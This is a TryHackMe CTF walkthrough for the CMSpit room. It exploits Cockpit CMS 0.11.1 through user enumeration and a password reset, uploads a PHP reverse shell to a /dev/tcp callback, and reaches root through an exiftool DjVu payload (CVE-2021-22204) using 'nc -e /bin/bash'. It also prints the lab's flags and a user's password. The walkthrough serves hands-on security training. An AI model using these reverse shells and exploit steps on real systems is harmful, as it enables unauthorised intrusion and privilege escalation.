# CMSpit Tryhackme walkthrough

---

Semi-guided challenge medium level (privesc required) difficulty.

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/001.png)

#### **Step 1: nmap**


```bash
nmap -sC -sV -A 10.67.178.92
```


Port 80 and 22 are opened.

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/002.png)

After going to the browser and checking port 80 (http) we can see that there is Cockpit running:

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/003.png)

What is the name of the Content Management System (CMS) installed on the server?

The application running is Cockpit

#### **Step 2: view-source**

Right click — view-source reveals the version

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/004.png)

What is the version of the Content Management System (CMS) installed on the server?

0.11.1

#### **Step 3: Dev Tools**

What is the path that allow user enumeration?

First we need to open up DevTools (right click > Inspect) and put admin:admin in a login form (sending POST request)

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/005.png)

Navigating to Network we can see that the answer is auth/check:

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/006.png)

#### **Step 4: searchploit**

We can use searchploit to find an exploit that can help answer the next question


```text
searchsploit -m cockpit
```


![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/007.png)

As we can see our version of Cockpit is 0.11.1, so we need an exploit 50185.py. We will download it to our system.


```text
searchploit -m 50185.py
```


![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/008.png)

If we cat the exploit, we will see the instruction inside: def usage():

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/009.png)

We need to do the following:


```bash
python3 50185.py -u http://10.65.162.48
```


![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/010.png)

How many users can you identify when you reproduce the user enumeration attack?

4

The next question is:

What is the path that allows you to change user account passwords?

For that we will check the exploit again

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/011.png)

As we may see, the answer is /auth/resetpassword

#### **Step 5: Access to Cockpit**

Following the exploit, we will discover skidy’s email:

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/012.png)

Compromise the Content Management System (CMS). What is Skidy’s email.

[**skidy@tryhackme.fakemail**](mailto:skidy@tryhackme.fakemail)

Next, we will do the same and reset the password for admin

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/013.png)

After resetting the password, we can login in Cockpit

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/014.png)

Then we choose Finder

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/015.png)

and get our webflag

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/016.png)

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/017.png)

#### **Step 6: database**

Compromise the machine and enumerate collections in the document database installed in the server. What is the flag in the database?

Because we have an access to Cockpit, we upload a reverse shell to gain remote access from our Kali machine. I create a nano file revershell.php and will paste this:


```php
<?php
exec
(
"/bin/bash -c 'bash -i >& /dev/tcp/10.65.72.238/1234 0>&1'"
);
?>
```


![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/018.png)

And then upload it to Cockpit

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/019.png)

Now it is here

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/020.png)

Let’s set up a listener in Kali:


```yaml
rlwrap nc -lvnp 1234
```


Then trigger the shell, putting in browser:

<http://10.67.178.92/reverseshell.php>

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/021.png)

We got a connection in our Listener:

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/022.png)

Time to search for the flag in the database:


```bash
ls -la /home
```

```bash
ls -la /home/stux
```


We need to open the file .dbshell. This file stores MongoDB shell history, which may contain credentials or sensitive queries.

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/023.png)


```bash
cat /home/stux/.dbshell
```


![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/024.png)

The flag is here: thm{c3d1af8da23926a30b0c8f4d6ab71bf851754568}

NB: take a note of “stux” and password. We will need it.

#### **Step 7: user.txt through stux**

We can escalate privileges now and become stux to get access to user.txt because we can spawn in

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/025.png)

Let’s stabilize the shell first


```bash
python3 -c ‘import pty; pty.spawn(“/bin/bash”)’
export
 TERM=xterm
```


now we need to Background it:


```text
Ctrl + Z
```


As we can see the session stopped. Let’s do the trick:


```bash
stty raw -echo; fg
```


Changing the user:


```text
su stux
```

```text
p4ssw0rdhack3d!123
```


This upgrades the shell to a fully interactive TTY. After this we can get access to user.txt

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/026.png)

The flag is: thm{c5fc72c48759318c78ec88a786d7c213da05f0ce}

#### **Step 8: get root**

After becoming stux, we need to find a vector for privilege escalation.


```bash
sudo -l
```


![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/027.png)

Exiftool is out great finding — NOPASSWD for root. It means that we can do a command execution via malicious DjVu metadata

What is the CVE number for the vulnerability affecting the binary assigned to the system user? Answer format: CVE-0000–0000

Just Google it

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/028.png)

CVE-2021–22204

Let’s read the details:

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/029.png)


```bash
cd /home/stux
```


We will create a payload.txt file right in our current stux shell:


```bash
printf ‘(metadata “\\c${system(\\”nc -e /bin/bash 10.65.72.133 1234\\”)};”)’ > payload.txt
```


and compile it:


```javascript
djvumake exploit.djvu INFO=1,1 BGjp=/dev/null ANTa=payload.txt
```


![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/030.png)

Now we will open another terminal in out Attack box and set up a listener

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/031.png)

Come back to the stux shell and trigger exploit.djvu:


```bash
sudo /usr/local/bin/exiftool exploit.djvu
```


![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/032.png)

Go back to Attack box second terminal and receive a connection as a root:

![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/033.png)


```bash
cd /root
```


![CMSpit Tryhackme walkthrough screenshot](../../assets/cmspit-tryhackme-walkthrough/034.png)

The flag is: thm{bf52a85b12cf49b9b6d77643771d74e90d4d5ada}

